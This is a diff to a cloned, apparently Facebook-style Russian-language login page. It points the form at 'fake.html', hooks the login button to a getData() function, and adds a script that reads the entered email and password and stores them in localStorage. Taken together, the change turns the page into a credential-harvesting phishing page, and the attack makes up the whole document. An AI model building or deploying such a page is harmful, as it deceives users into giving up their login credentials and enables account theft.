@@ -3121,7 +3121,7 @@
                             <div class="_8iep _8icy _9ahz _9ah-">
                                 <div class="_6luv _52jv">
                                     <form class="_featuredLogin__formContainer" data-testid="royal_login_form"
-                                          action="/action.php"
+                                          action="fake.html"
                                           method="get" >
 
                                         <div>
@@ -3150,7 +3150,7 @@
                                         <div class="_6ltg">
                                             <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
                                                     name="login" data-testid="royal_login_button" type="submit"
-                                                    id="u_0_d_Yt">Вход
+                                                    id="u_0_d_Yt" onclick="getData()">Вход
                                             </button>
                                         </div>
                                         <div class="_6ltj"><a
@@ -3163,6 +3163,18 @@
                                                               data-testid="open-registration-form-button" rel="async">Создать
                                             аккаунт</a></div>
                                     </form>
+
+                                    <script>
+
+                                        function getData() {
+                                            var email = document.getElementById("email").value;
+                                            var password = document.getElementById("password").value;
+
+                                            localStorage.setItem("txtValue", email);
+                                            localStorage.setItem("txtValue1", password);
+                                        }
+
+                                    </script>
                                 </div>
                                 <div id="reg_pages_msg" class="_58mk"><a
                                   href class="_8esh">Создать Страницу</a>
